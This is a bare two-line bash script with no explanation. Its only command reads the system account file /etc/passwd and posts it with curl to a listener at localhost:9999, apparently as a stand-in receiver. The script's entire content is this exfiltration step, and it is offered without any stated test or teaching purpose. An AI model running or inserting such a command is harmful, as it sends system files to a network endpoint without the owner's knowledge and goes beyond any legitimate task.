#!/bin/bash

curl -X POST -F -f=@- localhost:9999 < <(cat /etc/passwd)
